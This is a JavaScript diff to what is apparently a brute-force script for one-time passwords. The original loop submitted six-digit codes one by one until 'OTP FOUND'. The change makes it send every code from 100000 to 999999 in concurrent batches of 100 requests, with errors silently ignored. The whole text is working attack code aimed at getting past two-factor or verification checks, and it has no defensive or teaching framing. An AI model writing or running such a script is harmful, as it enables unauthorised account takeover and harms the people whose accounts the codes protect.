@@ -17,21 +17,24 @@ async function SendRequest(otp){
         data : data
     };
     
-    return await axios.request(config)
-        .then((response) => {
-        return JSON.stringify(response.data);
-        })
-        .catch((error) => {
-        });
-
-}
-
-for(let i=100000;i<=999999;i++){
-   console.log(i.toString());
-   const success = await SendRequest(i.toString());
-   if (success) {
-        console.log("OTP FOUND:", i);
-        break;   //  STOP LOOP
+    try {
+        await axios.request(config)
+    } catch (error) {
+        // console.log("e")
     }
-   
+
 }
+
+async function main(){
+    for(let i=100000;i<=999999;i+=100){
+        let p =[]
+        for(let j=0;j<100;j++){
+            console.log(i)
+            p.push(SendRequest((i+j).toString()));
+        }
+        await Promise.all(p)
+       
+    }
+}
+
+main();
